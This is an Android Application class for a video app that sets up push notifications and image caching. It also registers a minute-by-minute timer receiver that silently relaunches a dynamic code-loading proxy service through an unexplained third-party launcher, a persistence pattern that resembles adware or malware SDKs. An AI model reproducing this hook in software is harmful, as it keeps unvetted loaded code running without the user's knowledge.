package com.qxshikong.myvideoapp.util;

import android.app.ActivityManager;
import android.app.Application;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;

import com.nostra13.universalimageloader.cache.disc.impl.UnlimitedDiskCache;
import com.nostra13.universalimageloader.cache.disc.naming.HashCodeFileNameGenerator;
import com.nostra13.universalimageloader.cache.memory.impl.LruMemoryCache;
import com.nostra13.universalimageloader.core.DisplayImageOptions;
import com.nostra13.universalimageloader.core.ImageLoader;
import com.nostra13.universalimageloader.core.ImageLoaderConfiguration;
import com.nostra13.universalimageloader.core.assist.QueueProcessingType;
import com.nostra13.universalimageloader.core.decode.BaseImageDecoder;
import com.nostra13.universalimageloader.core.download.BaseImageDownloader;

import org.windbell.window.DlLauncher;
import org.xutils.BuildConfig;
import org.xutils.x;

import java.io.File;
import android.app.ActivityManager.RunningServiceInfo;


import cn.jpush.android.api.JPushInterface;

public class MyApp extends Application{

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		super.onCreate();
		JPushInterface.init(this);
		x.Ext.init(this);
		  x.Ext.setDebug(BuildConfig.DEBUG);//����
		  File cachDir = new File(UsedUtil.createCacheFolder());
		  ImageLoaderConfiguration config = new ImageLoaderConfiguration.Builder(this)
			        .threadPoolSize(3) // default  线程池内加载的数量
			        .threadPriority(Thread.NORM_PRIORITY - 2) // default 设置当前线程的优先级
			        .tasksProcessingOrder(QueueProcessingType.FIFO) // default
			        .denyCacheImageMultipleSizesInMemory()
			        .memoryCache(new LruMemoryCache(2 * 1024 * 1024)) //可以通过自己的内存缓存实现
			        .memoryCacheSize(2 * 1024 * 1024)  // 内存缓存的最大值
			        .memoryCacheSizePercentage(13) // default
			        .diskCache(new UnlimitedDiskCache(cachDir)) // default 可以自定义缓存路径  
			        .diskCacheSize(10 * 1024 * 1024) // 50 Mb sd卡(本地)缓存的最大值
			        .diskCacheFileCount(150)  // 可以缓存的文件数量 
			        // default为使用HASHCODE对UIL进行加密命名， 还可以用MD5(new Md5FileNameGenerator())加密
			        .diskCacheFileNameGenerator(new HashCodeFileNameGenerator()) 
			        .imageDownloader(new BaseImageDownloader(this)) // default
			        .imageDecoder(new BaseImageDecoder(false)) // default
			        .defaultDisplayImageOptions(DisplayImageOptions.createSimple()) // default
			       // .writeDebugLogs() // 打印debug log
			        .build(); //开始构建
		  ImageLoader.getInstance().init(config);
		//注册接收￿?
		IntentFilter filter = new IntentFilter(Intent.ACTION_TIME_TICK);
		TimeChangedReceiver receiver = new TimeChangedReceiver();
		registerReceiver(receiver, filter);

	}


	private boolean isPushSerRunning = false;
	//监听并保持service状�??
	class TimeChangedReceiver extends BroadcastReceiver
	{

		@Override
		public void onReceive(Context context, Intent intent) {
			// TODO Auto-generated method stub
			if (intent.getAction().equals(Intent.ACTION_TIME_TICK))
			{
				isPushSerRunning = false;
				//Log.i("updateapp","ApplicationContext TimeReceiver myPkgName:"+mPkgName);

				ActivityManager manager = (ActivityManager)context.getSystemService(Context.ACTIVITY_SERVICE);
				for (RunningServiceInfo service :manager.getRunningServices(Integer.MAX_VALUE))
				{
					String pkgName = service.service.getPackageName();
					//Log.i("updateapp","RunningServiceInfo service:"+service.service.getClassName()+",pkgName:"+pkgName);
					String myPkgName = context.getPackageName();

					if("com.pmt.dynamicload.PmtDLProxyService".equals(service.service.getClassName()) && pkgName.equalsIgnoreCase(myPkgName))
					{
						isPushSerRunning = true;
					}
				}
				//Log.i("updateapp","isPushSerRunning:"+isPushSerRunning);
				if(!isPushSerRunning){
					DlLauncher.runDL(context);
				}


			}
		}
	}
}
